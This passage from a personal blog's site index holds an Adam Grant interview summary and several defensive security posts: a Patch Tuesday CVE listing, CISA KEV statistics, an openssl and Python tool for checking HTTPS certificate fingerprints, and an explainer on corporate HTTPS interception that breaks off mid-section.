21:06","externalUrl":null,"permalink":"/tags/argumentation/","section":"tags","summary":"","title":"argumentation","type":"tags"},{"content":" Are you tired of constantly arguing and never finding common ground?\nThis video argues that the root cause of our problems is our addiction to being right. It offers an alternative way of thinking: approaching issues like a scientist to find the truth, not win arguments.\nSpeaker: Adam Grant (Interviewed by Steve Bartlett)\nSummary # The worst problem in humanity is the addiction to being right. People get stuck in three thinking modes: preacher, prosecutor, and politician. The speaker suggests an alternative: thinking like a scientist. Scientists don\u0026rsquo;t see their ideas as their identity; instead, they view them as hypotheses to be tested. People should focus on getting things right rather than being right. One way to do this is to separate beliefs from values. Beliefs are what you think is true, while values are what you think is important. Transcript # The worst problem in humanity is the addiction to being right. You’ve already concluded that other people are wrong and you’re right. You lose the ability to open your mind.\nHow do we get out of those modes?\nI so struck by how many people spend too many of their waking hours, thinking like preachers, prosecutors, and politicians.\nWhen you go into preacher mode, you’re prizing your own ideas. In prosecutor mode, you’re attacking somebody else’s ideas, and in politician mode you don’t even bother to listen to people unless they already agree with your ideas.\nI find that most people have a dominant style that gets them in trouble. So mine is prosecutor mode. If I think you’re wrong, I\u0026rsquo;m like, it is my professional and moral responsibility to correct you, which never goes well. And I’ve even been called a logic bully, which my wife had to explain to me was not a compliment.\nShe\u0026rsquo;s like, you don’t have to pressure test every single point that’s made. Sometimes you can listen and learn from other people, as opposed to duking it out to try to figure out who’s right.\nI think it’s such an important note because in prosecutor mode, you’ve already concluded that other people are wrong and you’re right. So you lose the ability to open your mind, and the same thing happens if you’re preaching or politicking.\nYou’re basically drinking your own Kool-Aid, or listening only to your own tribe, and trapping yourself in an echo chamber. And so I got really curious about, how do we get out of those modes? What’s an alternative?\nAnd my favorite alternative is to think think more like a scientist.\nWhen I say think like a scientist, I do not mean that you need to buy a microscope, or you know a telescope. I mean that you don’t let your ideas become your identity. You recognize every opinion you hold, it’s just a hypothesis. You can test it.\nEvery decision you make, just an experiment. It might succeed, it might fail.\nAnd when you do that, it turns out when people people can be taught to think more like scientists, when you teach people to see their opinions as hypotheses, their decisions as experiments, lo and behold, they make better choices.\nThey achieve more success because they become more flexible. They change their minds faster. They’re quicker to recognize that they’re wrong. And that means they’re quicker to get it right.\nA colleague once told me that the worst problem he sees in humanity is the addiction to being right. And I think it’s much more important to focus on getting it right than being right. One of the ways you do that is you do not let your beliefs become part of your self-concept.\nPeople are like, \u0026ldquo;wait, who are you if you’re not what you think?\u0026rdquo; You are what you value.\nWhat’s the difference between values and beliefs? Beliefs are what you think is True. Values are what you think is important.\nAnd I think this is such a critical distinction because when you start to base your identity, your sense of self, and your ego, and your self-esteem, and selfworth on what you think is true, then admitting you were wrong is a major threat.\nWhereas when you start to see yourself as someone who values curiosity, or is a lifelong learner, now changing your mind is a moment of growth.\n","date":"2024-07-21 21:06","externalUrl":null,"permalink":"/wisdom/thinking_trap/scientist/","section":"Wisdom Bread","summary":"Addiction to BEING RIGHT.","title":"Thinking Trap","type":"wisdom"},{"content":" 🦉 Accumulating life wisdom every day. 🦉 An inspirational video full of wisdom and inspiration for life that I subscribed to accumulate life wisdom every day.\nSource: WisdomBread YT Channel\n","date":"2024-07-21 21:06","externalUrl":null,"permalink":"/wisdom/","section":"Wisdom Bread","summary":"","title":"Wisdom Bread","type":"wisdom"},{"content":"","date":"2024-07-21 21:06","externalUrl":null,"permalink":"/categories/wisdombread/","section":"categories","summary":"","title":"WisdomBread","type":"categories"},{"content":"","date":"2024-07-12 19:37","externalUrl":null,"permalink":"/tags/infosec/","section":"tags","summary":"","title":"infosec","type":"tags"},{"content":"","date":"2024-07-12 19:37","externalUrl":null,"permalink":"/tags/privacy/","section":"tags","summary":"","title":"privacy","type":"tags"},{"content":" Security is the foundation and privacy is built on top of it. Key Takeawys # Security:\nFocuses on protecting information from unauthorized access. The CIA triad (Confidentiality, Integrity, and Availability) are the main principles of security. Protects confidential business information. PCI and SOX are regulations on security. Privacy:\nFocuses on how information about an individual is collected, used, disclosed, and protected. Notice, consent, and transparency are additional factors for privacy on top of security. Privacy protects personal information like health data and social security number. GDPR and HIPAA are regulations on privacy. If you aren\u0026rsquo;t paying for it, you are the product, not the customer. Products don\u0026rsquo;t get to call customer support.\n","date":"2024-07-12 19:37","externalUrl":null,"permalink":"/posts/security_vs_privacy/","section":"posts","summary":"If you aren\u0026rsquo;t paying for it, you are the product, not the customer. Products don\u0026rsquo;t get to call customer support.","title":"Security vs Privacy","type":"posts"},{"content":" This video is a summary of security updates released by Microsoft on July 9th, 2024. Key Takeaways # Here are the key points in brevity:\nThere are 142 newly published vulnerabilities in today’s release, which is higher than the average over the past 13 months. The highest scored vulnerability from today\u0026rsquo;s set is 9.8 on a scale of 10. There were two vulnerabilities (CVE-2024-38080 and CVE-2024-38112) that were publicly disclosed prior to release and two vulnerabilities known to be exploited at the time of release. A specific reason for the high number of vulnerabilities and the high average CVSS score is the 37 vulnerabilities in the SQL Server drivers. Microsoft is changing the way they document CVEs going forward. They will now be publishing CVEs for vulnerabilities that require no customer action. Patch Tuesday # $ ./patch_tuesday.py -k 2024-jul -vc _____ _ _ _____ _ | _ |___| |_ ___| |_ |_ _|_ _ ___ ___ _| |___ _ _ | __| .\u0026#39;| _| _| | | | | | | -_|_ -| . | .\u0026#39;| | | |__| |__,|_| |___|_|_| |_| |___|___|___|___|__,|_ | |___| [*] Finish fetching [2,435,964 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-jul Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; July 2024 Security Updates [ 2024-07-09 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 155 ] [-] High_Severity : [ 51 ] [-] High_likelihood : [ 14 ] [-] Exploited in_wild : [ 2 ] [+] Product Families : [ 8 ] High_Severity/51 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base ┃ CVSS_Temporal ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2017-17522 │ 8.8 │ 8.8 │ \u0026lt;\u0026gt; │ │ CVE-2024-21417 │ 8.8 │ 7.7 │ Windows Text Services Framework Elevation of Privilege Vulnerability │ │ CVE-2024-28899 │ 8.8 │ 7.7 │ Secure Boot Security Feature Bypass Vulnerability │ │ CVE-2024-38088 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-38087 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21332 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21333 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21335 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21373 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21398 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21414 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21415 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21428 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37318 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37332 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37331 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-38060 │ 8.8 │ 7.7 │ Windows Imaging Component Remote Code Execution Vulnerability │ │ CVE-2024-38077 │ 9.8 │ 8.5 │ Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability │ │ CVE-2024-38104 │ 8.8 │ 7.7 │ Windows Fax Service Remote Code Execution Vulnerability │ │ CVE-2024-30013 │ 8.8 │ 7.7 │ Windows MultiPoint Services Remote Code Execution Vulnerability │ │ CVE-2024-35271 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-35272 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-20701 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21303 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21308 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21317 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21331 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21425 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37319 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37320 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37321 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37322 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37323 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37324 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-21449 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37326 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37327 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37328 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37329 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37330 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37334 │ 8.8 │ 7.7 │ Microsoft OLE DB Driver for SQL Server Remote Code Execution Vulnerability │ │ CVE-2024-37333 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-37336 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-28928 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-35256 │ 8.8 │ 7.7 │ SQL Server Native Client OLE DB Provider Remote Code Execution Vulnerability │ │ CVE-2024-38021 │ 8.8 │ 7.7 │ Microsoft Office Remote Code Execution Vulnerability │ │ CVE-2024-38053 │ 8.8 │ 7.7 │ Windows Layer-2 Bridge Network Driver Remote Code Execution Vulnerability │ │ CVE-2024-38074 │ 9.8 │ 8.5 │ Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability │ │ CVE-2024-38076 │ 9.8 │ 8.5 │ Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability │ │ CVE-2024-38089 │ 9.1 │ 7.9 │ Microsoft Defender for IoT Elevation of Privilege Vulnerability │ │ CVE-2024-38092 │ 8.8 │ 7.9 │ Azure CycleCloud Elevation of Privilege Vulnerability │ └────────────────┴───────────┴───────────────┴──────────────────────────────────────────────────────────────────────────────┘ High_Likelihood/14 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base ┃ CVSS_Temporal ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38023 │ 7.2 │ 6.3 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38024 │ 7.2 │ 6.3 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38054 │ 7.8 │ 6.8 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38059 │ 7.8 │ 6.8 │ Win32k Elevation of Privilege Vulnerability │ │ CVE-2024-38060 │ 8.8 │ 7.7 │ Windows Imaging Component Remote Code Execution Vulnerability │ │ CVE-2024-38085 │ 7.8 │ 6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-38100 │ 7.8 │ 6.8 │ Windows File Explorer Elevation of Privilege Vulnerability │ │ CVE-2024-38021 │ 8.8 │ 7.7 │ Microsoft Office Remote Code Execution Vulnerability │ │ CVE-2024-38052 │ 7.8 │ 6.8 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38066 │ 7.8 │ 6.8 │ Windows Win32k Elevation of Privilege Vulnerability │ │ CVE-2024-38079 │ 7.8 │ 6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-38094 │ 7.2 │ 6.3 │ Microsoft SharePoint Remote Code Execution Vulnerability │ │ CVE-2024-38099 │ 5.9 │ 5.2 │ Windows Remote Desktop Licensing Service Denial of Service Vulnerability │ │ CVE-2024-39684 │ 7.8 │ 6.8 │ Github: CVE-2024-39684 TenCent RapidJSON Elevation of Privilege Vulnerability │ └────────────────┴───────────┴───────────────┴────────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/2 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base ┃ CVSS_Temporal ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38080 │ 7.8 │ 6.8 │ Windows Hyper-V Elevation of Privilege Vulnerability │ │ CVE-2024-38112 │ 7.5 │ 7.0 │ Windows MSHTML Platform Spoofing Vulnerability │ └────────────────┴───────────┴───────────────┴──────────────────────────────────────────────────────┘ [+] Product Families (8) Developer Tools ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 77 Azure ▇▇▇▇▇▇▇▇▇ 29 Windows ▇▇▇▇▇▇▇▇ 26 Microsoft Office ▇▇▇▇ 13 ESU ▇▇▇ 10 SQL Server ▇▇▇ 10 Microsoft Dynamics ▏ 1 System Center ▏ 1 [*] \u0026#34;July 2024 Security Updates\u0026#34; (Rev 20) [-] Initial Release date: 2024-07-09T07:00:00 [-] Current Release date: 2024-07-09T00:00:00 [*] [2024-07-10] main(): Completed within [6.8730 sec]. ","date":"2024-07-10 11:34","externalUrl":null,"permalink":"/posts/2024_jul/","section":"posts","summary":"Security Update Release Summary July 2024.","title":"Patch Tuesday (2024-07)","type":"posts"},{"content":" CISA KEV has been released 32 months. Today, there are total of 1126 (+23) CVE been added to CISA KEV catalog.\nCISA Catalog of Known Exploited Vulnerabilities [ 2024.06.26/1126 ]\nUpdates # As of today, there are total of 1118 CVE have overdue, and another 8 will due in July 2024.\nHighlights (within CISA KEV catalog):\nThe top-5 vendors with highest number of vulnerabilities remain the same (total 179 vendors). The top-5 vendors hold 558 (around 49%) of all the 1126 CVEs. The top-5 vulnerable products remain the same (total 463 products). There are 242 (or ~21%) CVE found at the top-5 vulnerable products. The mean value increases to 93.83 (was 91.92). The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 287 75 71 67 58 568 Windows Multiple Products (Apple) Internet Explorer Chromium V8 Flash Player others 114 38 31 30 29 884 mean_val=93.83333333333333\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 28 32 132 164 241 160 66 46 47 45 125 40 ","date":"2024-07-01 02:28","externalUrl":null,"permalink":"/posts/cisa_kev_32m/","section":"posts","summary":"Analysis updates of CISA KEV catalog.","title":"32-Month Update with CISA KEV","type":"posts"},{"content":"","date":"2024-06-27 19:08","externalUrl":null,"permalink":"/tags/fingerprint/","section":"tags","summary":"","title":"fingerprint","type":"tags"},{"content":" Secure browser HTTPS connections can be intercepted (and decrypted) by authorities who spoof the authentic site\u0026rsquo;s certificate. But the authentic site\u0026rsquo;s fingerprint CANNOT be duplicated!\nThus, fingerprint checking is to guarantee that the HTTPS certificate is the right one. And this is one of a reliable way to detect any HTTPS Interception.\nFingerprint # Websites, unlike buildings, lack a physical address to confirm you\u0026rsquo;re in the right place. That\u0026rsquo;s where the \u0026ldquo;certificate fingerprint\u0026rdquo; comes in.\nIt\u0026rsquo;s a unique digital code, like a fingerprint, that identifies a website\u0026rsquo;s security certificate (its ID card). By checking the fingerprint, you can help ensure you\u0026rsquo;re on the real website, not a fake one trying to steal your info. It\u0026rsquo;s a complex code, but helpful for security when used with other practices.\nCmdline # Using cmdline tool, openssl, to get fingerprint of a HTTPS certificate.\n$ openssl s_client -connect www.grc.com:443 \u0026lt; /dev/null 2\u0026gt;/dev/null | openssl x509 -fingerprint -noout -in /dev/stdin SHA1 Fingerprint=A6:8F:8C:47:6B:D0:DE:9E:1D:18:4A:0A:51:4D:90:11:31:93:40:6D $ openssl s_client -connect www.grc.com:443 \u0026lt; /dev/null 2\u0026gt;/dev/null | openssl x509 -fingerprint -sha1 -noout -in /dev/stdin sha1 Fingerprint=A6:8F:8C:47:6B:D0:DE:9E:1D:18:4A:0A:51:4D:90:11:31:93:40:6D $ openssl s_client -connect www.grc.com:443 \u0026lt; /dev/null 2\u0026gt;/dev/null | openssl x509 -fingerprint -sha256 -noout -in /dev/stdin sha256 Fingerprint=DA:2C:F7:62:09:2C:0A:7B:88:A0:DA:65:F9:29:45:97:A6:DB:AA:2C:80:FD:75:0A:D9:A0:75:EE:64:EE:06:68 Python # The latest version is always available at https://github.com/myseq/utils\nThis is a Python script that can show a fingerprint, Issuer, and Issuee of a HTTPS certificate.\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- import argparse from datetime import datetime from timeit import default_timer as timer from rich import print as rprint import ssl, socket import OpenSSL import hashlib https = \u0026#39;myseq.github.io\u0026#39; desc = f\u0026#39;Fingerprinting HTTPS Certificate.\u0026#39; note = f\u0026#39;\u0026#39;\u0026#39; This is a tool to fingerprint any HTTPS certificate, including the Issuer and Issuee. \u0026#39;\u0026#39;\u0026#39; banner = f\u0026#39;\u0026#39;\u0026#39; Zzzzz |\\ _,,,---,,_ /,`.-\u0026#39;`\u0026#39; -. ;-;;,_ __author__ : [ zd ] |,4- ) )-,_..;\\ ( `\u0026#39;-\u0026#39; __year__ : [ 2024.06 ] \u0026#39;---\u0026#39;\u0026#39;(_/--\u0026#39; `-\u0026#39;\\_) __file__ : [ {__file__} ] [ {desc} ] \u0026#39;\u0026#39;\u0026#39; verbose = False def timeit(func): def timed(*args, **kwargs): stime = timer() result = func(*args, **kwargs) etime = timer() rprint(f\u0026#39;\\n :timer_clock: {func.__name__}(): completed within [{etime-stime:.4f} sec].\\n \u0026#39;) return result return timed def Formatting(thumb_hash): fp = \u0026#39;\u0026#39; for i in range(0, len(thumb_hash), 2): fp += thumb_hash[i:i+2] if i \u0026lt; len(thumb_hash)-2: fp += \u0026#39;:\u0026#39; return fp def Validating(date1,date2): today = datetime.now() dt1 = datetime.strptime(date1, \u0026#34;%Y%m%d%H%M%SZ\u0026#34;) dt2 = datetime.strptime(date2, \u0026#34;%Y%m%d%H%M%SZ\u0026#34;) if dt1 \u0026lt;= today \u0026lt;= dt2: return \u0026#39;Valid :+1: \u0026#39; else: return \u0026#39;Invalid :warning: \u0026#39; def get_details(cert): details = {} details[\u0026#39;subject\u0026#39;] = {key.decode(): value.decode() for key, value in cert.get_subject().get_components()} details[\u0026#39;issuer\u0026#39;] = {key.decode(): value.decode() for key, value in cert.get_issuer().get_components()} details[\u0026#39;serialNumber\u0026#39;] = cert.get_serial_number() details[\u0026#39;version\u0026#39;] = cert.get_version() + 1 # pyOpenSSL returns version as 0-indexed details[\u0026#39;notBefore\u0026#39;] = cert.get_notBefore().decode() details[\u0026#39;notAfter\u0026#39;] = cert.get_notAfter().decode() details[\u0026#39;signatureAlgorithm\u0026#39;] = cert.get_signature_algorithm().decode() # Extract public key details pub_key = cert.get_pubkey() pub_key_bits = pub_key.bits() pub_key_type = pub_key.type() details[\u0026#39;publicKey\u0026#39;] = { \u0026#39;type\u0026#39;: pub_key_type, \u0026#39;bits\u0026#39;: pub_key_bits, \u0026#39;key\u0026#39;: pub_key } # Extract extensions extensions = {} for i in range(cert.get_extension_count()): ext = cert.get_extension(i) extensions[ext.get_short_name().decode()] = str(ext) details[\u0026#39;extensions\u0026#39;] = extensions return details def Showing(cert_bin): cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert_bin) cert_details = get_details(cert) #rprint(cert_details) issued_to = f\u0026#34;{cert_details.get(\u0026#39;subject\u0026#39;).get(\u0026#39;CN\u0026#39;)}\u0026#34; org_name1 = f\u0026#34;{cert_details.get(\u0026#39;subject\u0026#39;).get(\u0026#39;O\u0026#39;,\u0026#39;\u0026#39;)}\u0026#34; issued_by = f\u0026#34;{cert_details.get(\u0026#39;issuer\u0026#39;).get(\u0026#39;CN\u0026#39;)}\u0026#34; org_name2 = f\u0026#34;{cert_details.get(\u0026#39;issuer\u0026#39;).get(\u0026#39;O\u0026#39;,\u0026#39;\u0026#39;)}\u0026#34; serial_no = f\u0026#34;{cert_details.get(\u0026#39;serialNumber\u0026#39;)}\u0026#34; notbefore = f\u0026#34;{cert_details.get(\u0026#39;notBefore\u0026#39;)}\u0026#34; not_after = f\u0026#34;{cert_details.get(\u0026#39;notAfter\u0026#39;)}\u0026#34; sign_algo = f\u0026#34;{cert_details.get(\u0026#39;signatureAlgorithm\u0026#39;)}\u0026#34; publickey = f\u0026#34;{cert_details.get(\u0026#39;publicKey\u0026#39;).get(\u0026#39;bits\u0026#39;)}\u0026#34; subjetalt = f\u0026#34;{cert_details.get(\u0026#39;extensions\u0026#39;).get(\u0026#39;subjectAltName\u0026#39;,\u0026#39;\u0026#39;)}\u0026#34; title = \u0026#39;Certificate\u0026#39; rprint(f\u0026#39;{title}\u0026#39;) rprint(f\u0026#39;{\u0026#34;=\u0026#34;*len(title)}\u0026#39;) if verbose: rprint(f\u0026#39;Serial_No: [i]{serial_no}[/i]\u0026#39;) validity = Validating(notbefore, not_after) rprint(f\u0026#39;Issued_To: [i]cn={issued_to}[/i] [ o={org_name1} ]\u0026#39;) rprint(f\u0026#39;Issued_By: [i]cn={issued_by}[/i] [ o={org_name2} ]\u0026#39;) dt1 = datetime.strptime(notbefore, \u0026#39;%Y%m%d%H%M%SZ\u0026#39;) dt2 = datetime.strptime(not_after, \u0026#39;%Y%m%d%H%M%SZ\u0026#39;) rprint(f\u0026#39; Validity: [i]\\\u0026#39;{dt1:%Y-%m-%d %H:%M:%S %Z}\\\u0026#39;/\\\u0026#39;{dt2:%Y-%m-%d %H:%M:%S %Z}\\\u0026#39;[/i] [ {validity} ]\u0026#39;) print(f\u0026#39;\u0026#39;) thumb_sha1 = hashlib.sha1(cert_bin).hexdigest() thumb_sha2 = hashlib.sha256(cert_bin).hexdigest() fp1 = Formatting(thumb_sha1) fp2 = Formatting(thumb_sha2) if verbose: rprint(f\u0026#39;Public Key : {publickey} bits \u0026#39;) rprint(f\u0026#39;Algo Used : {sign_algo} \u0026#39;) rprint(f\u0026#39;Fingerprint: \\\u0026#39;{fp1}\\\u0026#39; :thumbsup: [SHA1]\u0026#39;) if verbose: rprint(f\u0026#39;Fingerprint: \\\u0026#39;{fp2}\\\u0026#39; :+1: [SHA256]\u0026#39;) rprint(f\u0026#39;\\nAlt Name : \\\u0026#39;{subjetalt}\\\u0026#39;\\n\u0026#39;) def usage(): \u0026#34;\u0026#34;\u0026#34; usage() function \u0026#34;\u0026#34;\u0026#34; parser = argparse.ArgumentParser(description=banner, formatter_class=argparse.RawTextHelpFormatter, epilog=note) parser.add_argument(\u0026#39;https\u0026#39;, metavar=\u0026#39;https-site\u0026#39;, help=\u0026#39;HTTPS site.\u0026#39;) parser.add_argument(\u0026#39;-p\u0026#39;, metavar=\u0026#39;[0..65535]\u0026#39;, default=443, type=int, help=\u0026#39;TCP port (default to 443).\u0026#39;) parser.add_argument(\u0026#39;-v\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;verbose output\u0026#39;) return parser.parse_args() @timeit def main(): \u0026#34;\u0026#34;\u0026#34; main() function \u0026#34;\u0026#34;\u0026#34; global verbose global https args = usage() verbose = True if args.v else False https = args.https port = args.p rprint(f\u0026#39;\\n [*] [i]Fingerprint-check on [u]https://{https}:{port}/[/u] ...[/i] :magnifying_glass_tilted_left: \\n\u0026#39;) ctx = ssl.create_default_context() ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE with ctx.wrap_socket(socket.socket(), server_hostname=https) as s: s.connect((https, port)) cert_bin = s.getpeercert(True) #cert = s.getpeercert() Showing(cert_bin) if __name__ == \u0026#34;__main__\u0026#34;: main() OCSP # OCSP Online Certificate Status Protocol OCSP is a security protocol that helps your web browser confirm a website\u0026rsquo;s certificate is valid and not revoked, adding another layer of protection for your online activities. It works alongside CAs and certificate validation to ensure a safer browsing experience.\nChecking with Security (OCSP) While CAs verify identities initially, certificates can expire or get revoked (like a lost ID). OCSP is a protocol that lets your web browser ask the CA (the security guard) in real-time: \u0026ldquo;Is this website\u0026rsquo;s certificate still valid?\u0026rdquo;. Links # How To Find SSL Certificate Fingerprints Online Certificate Status Protocol ","date":"2024-06-27 19:08","externalUrl":null,"permalink":"/posts/fingerprint_https/","section":"posts","summary":"Detecting HTTPS interception with fingerprint.","title":"Fingerprint HTTPS Certificate","type":"posts"},{"content":"","date":"2024-06-27 19:08","externalUrl":null,"permalink":"/tags/https/","section":"tags","summary":"","title":"https","type":"tags"},{"content":"","date":"2024-06-27 06:39","externalUrl":null,"permalink":"/tags/firefox/","section":"tags","summary":"","title":"firefox","type":"tags"},{"content":" Myth Busted: Using HTTPS doesn\u0026rsquo;t mean your connection is untouchable!\nEnsure TRUE privacy with End-to-End and look beyond the padlock.\nWe all rely on the little padlock icon in our browsers to signal a secure connection.\nHTTPS (Hypertext Transfer Protocol Secure) encrypts communication between your device and the website, protecting your data from eavesdroppers.\nHowever, it\u0026rsquo;s important to understand that HTTPS alone doesn\u0026rsquo;t guarantee complete end-to-end encryption. In some cases, a company\u0026rsquo;s internal IT setup can intercept traffic even with HTTPS.\nThis post will explore how to identify potential signs of such scenarios and discuss some mitigation strategies to enhance your online security.\n1. Why HTTPS Interception? # There are 3 common reasons why a company might intercept HTTPS connections.\nSecurity Monitoring: Companies might want to peek inside encrypted traffic to hunt for malware or viruses before they infect their network. It\u0026rsquo;s like checking everyone\u0026rsquo;s lunchbox before entering the office building.\nData Leak Prevention: Imagine employees accidentally (or not so accidentally) uploading confidential files. HTTPS interception can help companies catch such leaks before sensitive data gets out.\nKeeping Employees Focused: Some companies use HTTPS interception to see what websites or apps employees are using. They might be concerned about wasted time or inappropriate browsing habits.\n2. How It Works? # While HTTPS encrypts communication between your device and a website, some companies can still intercept this traffic.\nOne method involves installing a self-signed certificate as a trusted root certificate on employee devices. This essentially tricks your browser into thinking the company\u0026rsquo;s internal server is a legitimate Certificate Authority (CA).\nWith this certificate in place, the company can deploy a transparent proxy. This proxy acts as an intermediary between your device and the internet.\nSince the encrypted traffic is decrypted by the proxy using the trusted self-signed certificate, the company can inspect the content before allowing it to reach its final destination.\nThis allows them to monitor all HTTPS traffic flowing through their network.\nThis practice can have privacy implications, and employees should be aware of its existence within a company network.\nCompany should obtained explicit employee consent and inform about the purpose before doing so.\nUnfortunately, detecting HTTPS interception using only the browser itself can be quite inefficient, especially when the company has installed a trusted root certificate.\n3. Prevention # One common way to prevent HTTPS interception is with TLS pinning.\nThis is a prevention method to be deployed as an extra layer of security at the web application.\nTLS pinning, also known as certificate pinning, is a security mechanism used to enhance the trust established during a TLS handshake (the initial communication between a client and server). It specifically aims to prevent Man-in-the-Middle (MitM) attacks by ensuring the client only connects to the intended server with the expected security certificate.\nHere\u0026rsquo;s a breakdown of how it works:\nPinning the Keys: 